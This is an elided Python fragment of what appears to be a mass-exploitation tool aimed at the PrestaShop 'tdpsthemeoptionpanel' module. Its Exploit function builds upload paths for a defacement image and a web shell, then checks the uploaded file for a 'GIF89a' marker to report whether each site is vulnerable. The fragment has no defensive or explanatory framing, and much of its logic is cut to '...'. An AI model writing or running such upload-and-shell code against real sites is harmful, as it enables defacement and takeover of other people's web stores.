...
def Exploit(site):
    ...
    try:
        ...
        if Checkvuln.status_code == 200:
            ...
            uploadedPathIndex = site + '/modules/tdpsthemeoptionpanel/upload/' + Jce_Deface_image.split('/')[1]
            uploadedPathShell = site + '/modules/tdpsthemeoptionpanel/upload/' + ShellPresta.split('/')[1]
            ...
            if 'GIF89a' in CheckIndex.content:
                ...
                return printModule.returnYes(site, 'N/A', 'tdpsthemeoptionpanel Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'tdpsthemeoptionpanel Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'tdpsthemeoptionpanel Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'tdpsthemeoptionpanel Module', 'Prestashop')
